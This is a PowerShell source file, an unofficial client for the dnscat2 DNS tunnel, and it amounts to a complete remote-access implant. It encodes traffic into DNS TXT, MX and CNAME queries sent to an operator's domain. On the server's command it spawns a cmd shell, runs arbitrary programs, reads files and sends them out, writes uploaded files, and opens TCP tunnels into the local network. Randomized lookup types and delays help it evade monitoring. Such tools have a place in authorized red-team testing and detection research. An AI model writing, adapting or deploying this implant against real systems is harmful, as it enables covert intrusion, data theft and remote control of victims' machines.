function Convert-StringToHex ($String) {
    return ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($String)).split("-") -join "")
}

function Convert-BytesToHex ($Bytes) {
    return ([System.BitConverter]::ToString($Bytes) -replace '-')
}

function Convert-HexToBytes ($Hex) {
    [byte[]]$Bytes = @()
    while ($Hex.Length -gt 0) {
        $Bytes += [Convert]::ToInt16(($Hex[0..1] -join ""),16)
        $Hex = $Hex.Substring(2)
    }
    return $Bytes
}

function Convert-HexToString ($Hex) {
    $StringData = ""
    while ($Hex.Length -gt 0) {
        $StringData += [string][char][Convert]::ToInt16(($Hex[0..1] -join ""),16)
        $Hex = $Hex.Substring(2)
    }
    return $StringData
}

function New-RandomDNSField {
    return [string](Get-Random -Maximum 9999 -Minimum 1000)
}

function Update-Dnscat2ACK ($Data, $AcknowledgementNumber) {
    return ([string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $Data.Length/2) % 65535)))
}

function Compare-SequenceNumber ($SequenceNumber, $AcknowledgementNumber) {
    $SequenceNumber = [uint16]("0x" + $SequenceNumber)
    $AcknowledgementNumber = [uint16]("0x" + $AcknowledgementNumber)
    if ($AcknowledgementNumber -lt $SequenceNumber) { # ACK recently rolled over
        return ($AcknowledgementNumber + 65535 - $SequenceNumber)
    } else {
        return ($AcknowledgementNumber - $SequenceNumber)
    }
}

function New-Dnscat2SYN ($Domain, $SessionId, $SequenceNumber, $Options) {
    return ((New-RandomDNSField) + "00" + $SessionId + $SequenceNumber + $Options + "." + $Domain)
}

function New-Dnscat2FIN ($Domain, $SessionId) {
    return ((New-RandomDNSField) + "02" + $SessionId + "00" + "." + $Domain)
}

function New-Dnscat2MSG ($Domain, $SessionId, $SequenceNumber, $AcknowledgementNumber, $Data) {
    return ((New-RandomDNSField) + "01" + $SessionId + $SequenceNumber + $AcknowledgementNumber + $Data + "." + $Domain)
}

function Get-NextDnscat2Data ($DataQueue, $MaxMSGDataSize) {
    if ($DataQueue.Length -eq 0) {
        return ""
    }
    
    $DataQueue = $DataQueue -replace '(..(?!$))','$1-' -split '-'
    #$DataQueue = Convert-StringToHex $DataQueue
    $PacketCount = 0    # Tracks the total chars in the packet
    $SectionCount = 0    # Tracks the chars in each section between dots
    $Packet = ""
    foreach($Char in $DataQueue) {
        if($SectionCount -ge 30) {
            $SectionCount = 0
            $Packet += "."
        }
        if($PacketCount -ge ($MaxMSGDataSize)) {
            return $Packet.TrimEnd(".")
        }
        $Packet += $Char
        $SectionCount += 2
        $PacketCount += 2
    }
    return $Packet.TrimEnd(".")
}



function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupTypes) {
    if ($LookupTypes.Count -gt 0) {
        $LookupType = $LookupTypes | Get-Random
    } else {
        $LookupType = $LookupTypes[0]
    }

    $Command = ("set type=$LookupType`nserver $DNSServer`nset port=$DNSPort`nset retry=1`n" + $Packet + "`nexit")
    $result = ($Command | nslookup 2>&1 | Out-String)
    if ($LookupType -eq "TXT") {
        if ($result.Contains('"')) {
            return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)
        } else {
            return 1
        }
    } elseif ($LookupType -eq "MX") {
        if ($result.Contains('mail')) {
            $result = ([string](($result[($result.IndexOf("mail exchanger = ") + 17)..$result.Length] -join '').split("`n")[0])).replace($Domain,"").replace(".","").replace("`n","").replace(" ","").Trim()
            return $result
        } else {
            return 1
        }
    } elseif ($LookupType -eq "CNAME") {
        if ($result.Contains('canonical')) {
            $result = ([string](($result[($result.IndexOf("canonical name =") + 17)..$result.Length] -join '').split("`n")[0])).replace($Domain,"").replace(".","").replace("`n","").replace(" ","").Trim()
            return $result
        } else {
            return 1
        }
    } else {
        return 1
    }
}

function ConvertTo-Dnscat2Packet ($RawPacket) {
    if ((($RawPacket.Length)%2 -eq 1) -or ($RawPacket.Length -eq 0)) {
        return 1
    }
    
    $Packet = New-Object System.Collections.Hashtable
    $Packet["PacketId"] = ($RawPacket[0..3] -join "")
    $Packet["MessageType"] = ($RawPacket[4..5] -join "")
    $Packet["SessionId"] = ($RawPacket[6..9] -join "")
    
    $Data = ""
    switch ($Packet["MessageType"]) {
        "00" {
            $Packet["SequenceNumber"] = ($RawPacket[10..13] -join "")
            $Packet["AcknowledgementNumber"] = ($RawPacket[10..13] -join "")
            $Packet["Options"] = ($RawPacket[14..17] -join "")
            if ($Packet["Options"] -eq 1) {
                # Name
                $Packet["Name"] = ($RawPacket[18..$RawPacket.Length] -join "")
            } elseif ($Packet["Options"] -eq 32) {
                # Command
            }
          }
        "01" {
            $Packet["SequenceNumber"] = ($RawPacket[10..13] -join "")
            $Packet["AcknowledgementNumber"] = ($RawPacket[14..17] -join "")
            $Packet["Data"] = ($RawPacket[18..$RawPacket.Length] -join "")
          }
        "02" {
            $Packet["Reason"] = ($RawPacket[10..$RawPacket.Length] -join "")
          }
    }
    return $Packet
}

function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPort, $MaxPacketSize, $LookupTypes, $Delay, $Driver, $DriverOptions) {
    $SequenceNumber = (New-RandomDNSField)
    
    $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet (New-Dnscat2SYN $Domain $SessionId $SequenceNumber $Options) $Domain $DNSServer $DNSPort $LookupTypes)
    
    if ($Packet -eq 1) {
        Write-Error "Failed to start session. Ensure your dnscat2 server is set up correctly."
        return 1
    }
    
    $Session = New-Object System.Collections.Hashtable
    $Session["SessionId"] = $SessionId
    $Session["Domain"] = $Domain
    $Session["DNSServer"] = $DNSServer
    $Session["DNSPort"] = $DNSPort
    $Session["DriverDataQueue"] = $Packet["Data"]
    $Session["SequenceNumber"] = $SequenceNumber
    $Session["AcknowledgementNumber"] = $Packet["AcknowledgementNumber"]
    $Session["MaxPacketSize"] = $MaxPacketSize
    $Session["MaxMSGDataSize"] = ($MaxPacketSize - (New-Dnscat2MSG $Domain $SessionId $Packet["SequenceNumber"] $Packet["AcknowledgementNumber"] "").Length)
    $Session["Driver"] = $Driver
    $Session["Dead"] = $False
    $Session["NewSessions"] = New-Object System.Collections.Hashtable
    $Session["Delay"] = $Delay
    $Session["LookupTypes"] = $LookupTypes
    if($Driver -eq "console") {
    } elseif ($Driver -eq "command") {
        $Session["RemainingBytes"] = 0
        $Session["PacketId"] = ""
        $Session["PacketIdBF"] = ""
        $Session["IsResponse"] = ""
        $Session["CommandId"] = ""
        $Session["CommandFields"] = ""
        $Session["CommandPacketBuffer"] = ""
        $Session["Tunnels"] = New-Object System.Collections.Hashtable
        $Session["DeadTunnels"] = @()
    } elseif ($Driver -eq "exec") {
        $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessStartInfo.FileName = $DriverOptions
        $ProcessStartInfo.UseShellExecute = $False
        $ProcessStartInfo.RedirectStandardInput = $True
        $ProcessStartInfo.RedirectStandardOutput = $True
        $ProcessStartInfo.RedirectStandardError = $True
        $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
        $Process.Start() | Out-Null
        $StdOutDestinationBuffer = New-Object System.Byte[] 65536
        $StdOutReadOperation = $Process.StandardOutput.BaseStream.BeginRead($StdOutDestinationBuffer, 0, 65536, $null, $null)
        $StdErrDestinationBuffer = New-Object System.Byte[] 65536
        $StdErrReadOperation = $Process.StandardError.BaseStream.BeginRead($StdErrDestinationBuffer, 0, 65536, $null, $null)
        $Session["Process"] = $Process
        $Session["ProcessId"] = $Process.Id
        $Session["StdOutReadOperation"] = $StdOutReadOperation
        $Session["StdOutDestinationBuffer"] = $StdOutDestinationBuffer
        $Session["StdErrReadOperation"] = $StdErrReadOperation
        $Session["StdErrDestinationBuffer"] = $StdErrDestinationBuffer
    }
    if ($Session["MaxMSGDataSize"] -le 0) {
        Write-Error "Domain name is too long."
        return 1
    }
    return $Session
}

function New-Dnscat2Tunnel ($Session, $TunnelId) {
    $Socket = New-Object System.Net.Sockets.TcpClient
    $Handle = $Socket.BeginConnect($Session["Tunnels"][$TunnelId].Host,$Session["Tunnels"][$TunnelId].Port,$null,$null)
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while ($True) {
        if($Handle.IsCompleted) {
            try {
                $Socket.EndConnect($Handle)
                $Stream = $Socket.GetStream()
                $BufferSize = $Socket.ReceiveBufferSize
                break
            } catch {
                $Socket.Close()
                $Stopwatch.Stop()
                $Session["Tunnels"][$TunnelId].Add("Dead", $True)
                return $Session
            }
        }
        if($Stopwatch.Elapsed.TotalSeconds -gt 10) {
            $Socket.Close()
            $Stopwatch.Stop()
            $Session["Tunnels"][$TunnelId].Add("Dead", $True)
            return $Session
        }
        Sleep -Milliseconds 100
    }
    
    $Session["Tunnels"][$TunnelId].Add("Stream", $Stream)
    $Session["Tunnels"][$TunnelId].Add("Socket", $Socket)
    $Session["Tunnels"][$TunnelId].Add("BufferSize", $BufferSize)
    $Session["Tunnels"][$TunnelId].Add("StreamDestinationBuffer", (New-Object System.Byte[] $Session["Tunnels"][$TunnelId]["BufferSize"]))
    $Session["Tunnels"][$TunnelId].Add("StreamReadOperation", $Session["Tunnels"][$TunnelId]["Stream"].BeginRead($Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"], 0, $Session["Tunnels"][$TunnelId]["BufferSize"], $null, $null))
    $Session["Tunnels"][$TunnelId].Add("StreamBytesRead", 1)
    $Session["Tunnels"][$TunnelId].Add("Dead", $False)
    
    return $Session
}

function Read-FromDnscat2Tunnel ($Session, $TunnelId) {
    if ($Session["Tunnels"][$TunnelId]["StreamBytesRead"] -eq 0) {
        $Session["Tunnels"][$TunnelId].Dead = $True; return $Session
    }
    if ($Session["Tunnels"][$TunnelId]["StreamReadOperation"].IsCompleted) {
        $Session["Tunnels"][$TunnelId]["StreamBytesRead"] = $Session["Tunnels"][$TunnelId]["Stream"].EndRead($Session["Tunnels"][$TunnelId]["StreamReadOperation"])
        if($Session["Tunnels"][$TunnelId]["StreamBytesRead"] -eq 0){ $Session["Tunnels"][$TunnelId].Dead = $True; return $Session }
        $Data = $Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"][0..([int]($Session["Tunnels"][$TunnelId]["StreamBytesRead"])-1)]
        $Session["Tunnels"][$TunnelId]["StreamReadOperation"] = $Session["Tunnels"][$TunnelId]["Stream"].BeginRead($Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"], 0, $Session["Tunnels"][$TunnelId]["BufferSize"], $null, $null)

        # Queue tunnel packets
        $Data = Convert-BytesToHex $Data
        $PacketId = (New-RandomDNSField)
        $PacketId = ([Convert]::ToString(([convert]::ToUInt16($PacketId, 16) -band ( -bnot [uint16]([Math]::Floor(1 * [Math]::Pow(2,15))))),16)).PadLeft(4, '0')
        $PacketLengthField = ([Convert]::ToString(($PacketId.Length/2 + 2 + $TunnelId.Length/2 + $Data.Length/2),16)).PadLeft(8, '0')
        $DriverData = ($PacketLengthField + $PacketId + "1001" + $TunnelId + $Data)
        $Session["DriverDataQueue"] += $DriverData
    }
    return $Session
}

function Send-ToDnscat2Tunnel ($Session, $TunnelId, $Data) {
    try {
        [byte[]]$Bytes = Convert-HexToBytes $Data
        $Session["Tunnels"][$TunnelId]["Stream"].Write($Bytes, 0, $Bytes.Length)
    } catch {
        $Session["Tunnels"][$TunnelId].Dead = $True
    }
    return $Session
}

function Close-Dnscat2Tunnel ($Session, $TunnelId) {
    try { $Session["Tunnels"][$TunnelId].Dead = $True } catch { }
    try { $Session["Tunnels"][$TunnelId]["Stream"].Close() } catch { }
    try { $Session["Tunnels"][$TunnelId]["Socket"].Close() } catch { }
    return $Session
}

function Update-Dnscat2CommandSession ($Session) {
    if ($Session["CommandPacketBuffer"].Length -le 0) {
        return $Session
    }

    ## PROCESS COMMAND PACKETS
    while ($Session["CommandPacketBuffer"].Length -gt 0) {
        # Packet Header
        if (($Session["RemainingBytes"] -eq 0) -and ($Session["CommandPacketBuffer"].Length -ge 16)) {
            # Decode Command Packet Header
            $Session["Length"] = [Convert]::ToUInt32($Session["CommandPacketBuffer"][0..7] -join '', 16)
            $Session["PacketId"] = $Session["CommandPacketBuffer"][8..11] -join ''
            $Session["PacketIdBF"] = [Convert]::ToString(([convert]::ToUInt16($Session["CommandPacketBuffer"][8..11] -join '', 16) -bxor ([Math]::Floor(1 * [Math]::Pow(2,15)))),16)
            $Session["CommandId"] = $Session["CommandPacketBuffer"][12..15] -join ''
            $Session["RemainingBytes"] = ($Session["Length"] - 4)
            $Session["CommandPacketBuffer"] = $Session["CommandPacketBuffer"].Substring(16)
            $Session["CommandFields"] = ""
        } elseif ($Session["RemainingBytes"] -gt 0) { # Packet Data
            if ($Session.RemainingBytes*2 -ge $Session["CommandPacketBuffer"].Length) {
                # length of remaining command packet is -ge remaining data buffer
                # We can just grab the rest of the packet buffer
                $Session["CommandFields"] += $Session["CommandPacketBuffer"]
                $Session["RemainingBytes"] -= $Session["CommandPacketBuffer"].Length/2
                $Session["CommandPacketBuffer"] = ""
            } else {
                # length of remaining command packet is -lt remaining data buffer
                # We have another packet header in the buffer!
                $Session["CommandFields"] += $Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)
                $RemainingBytes = $Session.RemainingBytes*2
                $Session["RemainingBytes"] -= ($Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)).Length/2
                $Session["CommandPacketBuffer"] = $Session["CommandPacketBuffer"].Substring($RemainingBytes)
            }
            
            if ($Session["RemainingBytes"] -eq 0) { # If we've completed a packet, lets send it right now
                break
            }
        } else {
            # Happens when a piece of a packet header remains in the buffer
            # We should wait until the whole header is in the buffer before processing
            break
        }
    }

    ## INVOKE COMMAND PACKET
    if ($Session["RemainingBytes"] -eq 0) {
        switch ($Session["CommandId"])
        {
            "0000" # COMMAND_PING
            {
                #$PacketLengthField = ([Convert]::ToString((8 + $Session.CommandFields.Length),16)).PadLeft(8, '0')
                $PacketLengthField = ([Convert]::ToString((4 + $Session.CommandFields.Length/2),16)).PadLeft(8, '0')
                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0000" + $Session.CommandFields)
                $Session["DriverDataQueue"] += $DriverData
                return $Session
            }
            "0001" # COMMAND_SHELL
            {
                $NewSessionName = $Session.CommandFields
                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" "cmd"
                $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0001" + $NewSession.SessionId)
                $Session["DriverDataQueue"] += $DriverData
                return $Session
            }
            "0002" # COMMAND_EXEC
            {
                $NewSessionName = $Session.CommandFields.split("00")[0]
                $NewSessionCommand = Convert-HexToString $Session.CommandFields.split("00")[2]
                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
                $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
                $Session["DriverDataQueue"] += $DriverData
                return $Session
            }
            "0003" # COMMAND_DOWNLOAD
            {
                try {
                    $FileName = Convert-HexToString $Session.CommandFields.TrimEnd('00')
                    $FileHexDump = Convert-BytesToHex ([IO.File]::ReadAllBytes($FileName))
                    $PacketLengthField = ([Convert]::ToString((4 + $FileHexDump.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)
                    $Session["DriverDataQueue"] += $DriverData
                } catch {
                    $ErrorCode = $CommandId
                    $Reason = (Convert-StringToHex "Could not read file. Make sure to provide the full path!") + "00"
                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
                    $Session["DriverDataQueue"] += $DriverData
                }
            }
            "0004" # COMMAND_UPLOAD
            {
                try {
                    $Data = $Session['CommandFields']
                    
                    $FileName = Convert-HexToString ($Data[0..($Data.IndexOf('00') - 1)] -join '')
                    [String]$Data = (($Data[($Data.IndexOf('00') + 2)..$Data.Length]) -join '')
                    
                    [byte[]]$Bytes = Convert-HexToBytes $Data
                    [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
                } catch {
                    $ErrorCode = $CommandId
                    $Reason = (Convert-StringToHex "Could not write file") + "00"
                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
                    $Session["DriverDataQueue"] += $DriverData
                }
            }
            "0006" # COMMAND_DELAY
            {
                try {
                    $Session["Delay"] = [Convert]::ToUInt32($Session.CommandFields, 16)
                    Write-Host ('New Delay: ' + $Session["Delay"].ToString())
                } catch {}
                
            }
            "1000" # TUNNEL_CONNECT
            {
                try {
                    $Tunnel = New-Object System.Collections.Hashtable
                    $Tunnel.Add("Host", (Convert-HexToString $Session["CommandFields"].Substring(0, $Session["CommandFields"].Length - 4)).Trim(0))
                    $Tunnel.Add("Port", [Convert]::ToUInt16($Session["CommandFields"].Substring($Session["CommandFields"].Length - 4), 16))
                    $Tunnel.Add("TunnelId", ((New-RandomDNSField) + (New-RandomDNSField)))
                    $Session["Tunnels"].Add($Tunnel.TunnelId, $Tunnel)
                    
                    ## START UP TUNNEL
                    $Session = New-Dnscat2Tunnel $Session $Tunnel.TunnelId

                    if ($Session["Tunnels"][$Tunnel.TunnelId].Dead) {
                        $ErrorCode = $CommandId
                        $Reason = (Convert-StringToHex "Failed to start tunnel") + "00"
                        $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                        $DriverData = ($PacketLengthField + $Session.PacketIdBF + "1000" + $ErrorCode + $Reason)
                        $Session["DriverDataQueue"] += $DriverData
                    }
                    
                    $DriverData = ("00000008" + $Session.PacketIdBF + "1000" + $Tunnel.TunnelId)
                    $Session["DriverDataQueue"] += $DriverData
                } catch {
                    $ErrorCode = $CommandId
                    $Reason = (Convert-StringToHex "Failed to start tunnel") + "00"
                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "1000" + $ErrorCode + $Reason)
                    $Session["DriverDataQueue"] += $DriverData
                }
            }
            "1001" # TUNNEL_DATA
            {
                $TunnelId = $Session["CommandFields"].Substring(0, 8)
                $Data = $Session["CommandFields"].Substring(8)                
                $Session = Send-ToDnscat2Tunnel $Session $TunnelId $Data
            }
            "1002" # TUNNEL_CLOSE
            {
                $TunnelId = $Session["CommandFields"]
                $Session = Close-Dnscat2Tunnel $Session $TunnelId
            }
        }
    }
    
    return $Session
}

function Read-DataFromDriver ($Session) {
    if ($Session["Driver"] -eq "console") {
        $Data = ""
        if($Host.UI.RawUI.KeyAvailable) {
            $Data = ((Read-Host) + "`n")
        }
        $Session["DriverDataQueue"] += (Convert-StringToHex $Data)
        return $Session
    } elseif ($Session["Driver"] -eq "command") {
    
        # Tunnels are the only time a command session sends data without a prior request
        if ($Session["Tunnels"].Count -gt 0) {
            # Update Tunnels
            $TunnelIds = @()
            $TunnelIds += $Session["Tunnels"].Keys
            foreach ($TunnelId in $TunnelIds) {
                $Session = Read-FromDnscat2Tunnel $Session $TunnelId
                
                if ($Session[$TunnelId].Dead) {
                    $Session["DeadTunnels"] += $TunnelId
                }
            }
            
            # Remove Dead Tunnels
            foreach ($TunnelId in $Session["DeadTunnels"]) {
                $Session["Tunnels"].Remove($TunnelId)
            }
            $Session["DeadTunnels"] = @()
        }
        
    } elseif ($Session["Driver"] -eq "exec") {
        if($Host.UI.RawUI.KeyAvailable) {
            $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
        }
        if($Session["StdOutReadOperation"].IsCompleted) {
            $StdOutBytesRead = ($Session["Process"]).StandardOutput.BaseStream.EndRead($Session["StdOutReadOperation"])
            if($StdOutBytesRead -eq 0){ $Session.Dead = $True; return $Session }
            $Session["DriverDataQueue"] += Convert-BytesToHex ($Session["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)])
            $Session["StdOutReadOperation"] = ($Session["Process"]).StandardOutput.BaseStream.BeginRead($Session["StdOutDestinationBuffer"], 0, 65536, $null, $null)
        }
        if($Session["StdErrReadOperation"].IsCompleted) {
            $StdErrBytesRead = ($Session["Process"]).StandardError.BaseStream.EndRead($Session["StdErrReadOperation"])
            if($StdErrBytesRead -eq 0){ $Session.Dead = $True; return $Session }
            $Session["DriverDataQueue"] += Convert-BytesToHex ($Session["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)])
            $Session["StdErrReadOperation"] = ($Session["Process"]).StandardError.BaseStream.BeginRead($Session["StdErrDestinationBuffer"], 0, 65536, $null, $null)
        }
    }
    return $Session
}

function Send-DataToDriver ($Data, $Session) {
    if ($Session["Driver"] -eq "console") {
        $StringData = Convert-HexToString $Data
        Write-Host -n $StringData
    } elseif ($Session["Driver"] -eq "command") {
        $Session["CommandPacketBuffer"] += $Data
    } elseif ($Session["Driver"] -eq "exec") {
        $StringData = Convert-HexToString $Data
        ($Session["Process"]).StandardInput.WriteLine($StringData.TrimEnd("`r").TrimEnd("`n"))
    }
    return $Session
}

function Stop-Dnscat2Session ($Session) {
    Send-Dnscat2Packet (New-Dnscat2FIN $Session["Domain"] $Session["SessionId"] $Session["Domain"]) $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"]| Out-Null
    if ($Session["Driver"] -eq "exec") {
        taskkill /T /F /PID $Session["ProcessId"] 2>&1 | Out-Null
    }
    $Session["Dead"] = $True
    return $Session
}

function Update-Dnscat2Session ($Session) {
    try {
        # Delay
        Sleep -Milliseconds $Session['Delay']
    
        # Retrive Driver Data
        $Session = Read-DataFromDriver $Session
        
        if ($Session.Dead) {
            $Session = Stop-Dnscat2Session $Session
            return $Session
        }
        
        # Grab next data in the queue
        $PacketData = (Get-NextDnscat2Data $Session["DriverDataQueue"] $Session["MaxMSGDataSize"])
        
        try {
            $Packet = (Send-Dnscat2Packet (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData) $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"])
        } catch {
            Write-Host "HOST: Failed to send packet."
			$Session.Dead = $True
        }
        
        try {
            $Packet = (ConvertTo-Dnscat2Packet $Packet)
            if($Packet -eq 1){ Write-Host "HOST: Failed to ConvertTo-Dnscat2Packet..."; $Session.Dead = $True }
            
            if ($Packet["MessageType"] -eq "01") {
                # Check if server ACKed sent data
                $BytesACKed = (Compare-SequenceNumber $Session["SequenceNumber"] $Packet["AcknowledgementNumber"])
                if ($BytesACKed -ne 0) {
                    # If data was ACKed, remove it from Queue
                    $Session["DriverDataQueue"] = $Session["DriverDataQueue"].Substring($BytesACKed*2)
                }
                $Session["SequenceNumber"] = $Packet["AcknowledgementNumber"]
                
                # ACK the server data
                if ($Packet["Data"] -ne "") {
                    $Session["AcknowledgementNumber"] = Update-Dnscat2ACK $Packet["Data"] $Packet["SequenceNumber"]
                    $Session = Send-DataToDriver $Packet["Data"] $Session
                }
            } elseif ($Packet["MessageType"] -eq "02") {
                $Session.Dead = $True
                return $Session
            }
        } catch {
            Write-Host "HOST: Caught error while processing packet, dropping..."
			$Session.Dead = $True 
			$Session = Stop-Dnscat2Session $Session
        }
        
        if ($Session.Driver -eq "command") {
            $Session = Update-Dnscat2CommandSession $Session
        }
    } catch {
        $Session.Dead = $True
        $Session = Stop-Dnscat2Session $Session
    }
    return $Session
}

function Start-Dnscat2 {
    <#
    .SYNOPSIS
        Start a Dnscat2 session.

    .DESCRIPTION
        This powershell script is an unofficial client for the dnscat2 DNS tunnel.

    .PARAMETER Domain
        The Domain being used by the dnscat2 server.
    
    .PARAMETER DNSServer
        The hostname or IP Address to send DNS queries to.

    .PARAMETER DNSPort
        The port to send DNS queries to.

    .PARAMETER Command
        Start a command session. (Default)
		
    .PARAMETER Exec
        Link the I/O of a process with the Dnscat2 session.
    
    .PARAMETER Console
        Link the I/O of the console with the Dnscat2 session.
    
    .PARAMETER LookupTypes
        Set an array of lookup types. Each packet has its lookup type randomly selected from the array.
        Only TXT, MX, and CNAME records are supported. Default: @(TXT, MX, CNAME)
    
    .PARAMETER Delay
        Set a delay between each request, in milliseconds. (Default: 0)
    
    .PARAMETER MaxPacketSize
        Maximum length of a dnscat2 packet.
        
    .PARAMETER Name
        The name of your dnscat2 session. (Default: hostname)
    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)][Alias("d")][string]$Domain,
        [Alias("s")][string]$DNSServer="",
        [Alias("p")][ValidateRange(1,65535)][int32]$DNSPort=53,
		[switch]$Command=$True,
        [Alias("e")][string]$Exec="",
        [switch]$Console=$False,
        [string[]]$LookupTypes=@("TXT","MX","CNAME"),
        [int32]$Delay=0,
        [ValidateRange(1,240)][int32]$MaxPacketSize=240,
        [string]$Name=""
    )
    
    foreach ($LookupType in $LookupTypes) {
        if (!(@("TXT","MX","CNAME") -contains $LookupType)) {
            Write-Host ($LookupType + " is not a valid Lookup Type!")
            Write-Host ("Only TXT and MX lookups are allowed!")
            return
        }
    }
    
    if ($Exec -ne "") {
        $Driver = 'exec'
        $DriverOptions = $Exec
        $SYNOptions = "0001"
    } elseif ($Console) {
        $Driver = 'console'
		$DriverOptions = ""
        $SYNOptions = "0001"
    } else {
		$Driver = 'command'
		$DriverOptions = ""
		$SYNOptions = "0021"
	}
    
    if ($Name -eq '') {
        $Name = $Driver + ' (' + (hostname) + ')'
    }
    $SYNOptions += (Convert-StringToHex $Name) + '00'
    
    $Sessions = New-Object System.Collections.Hashtable
    $DeadSessions = @()
    $InitialSession = Start-Dnscat2Session (New-RandomDNSField) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize $LookupTypes $Delay $Driver $DriverOptions
    if ($InitialSession -eq 1) {
        return
    }
    $Sessions.Add($InitialSession["SessionId"], $InitialSession)
    
    try {
        while ($Sessions.Count -gt 0) {
            # Remove Dead Sessions
            foreach ($SessionId in $DeadSessions) {
                $Sessions.Remove($SessionId)
            }
            $DeadSessions = @()

            # Update Sessions
            $SessionIds = @()
            $SessionIds += $Sessions.Keys
            foreach ($SessionId in $SessionIds) {
                $Sessions[$SessionId] = Update-Dnscat2Session $Sessions[$SessionId]
                
                if ($Sessions[$SessionId].Dead) {
                    $DeadSessions += $SessionId
                }
                
                if (($Sessions[$SessionId])["NewSessions"].Count -gt 0) {
                    foreach ($NewSessionId in $Sessions[$SessionId].NewSessions.Keys) {
                        $Sessions.Add($NewSessionId, $Sessions[$SessionId]["NewSessions"][$NewSessionId])
                    }
                    $Sessions[$SessionId].NewSessions = New-Object System.Collections.Hashtable
                }
            }
        }
    } finally {
        $SessionIds = @()
        $SessionIds += $Sessions.Keys
        foreach ($SessionId in $SessionIds) {
            Stop-Dnscat2Session $Sessions[$SessionId]
        }
    }
}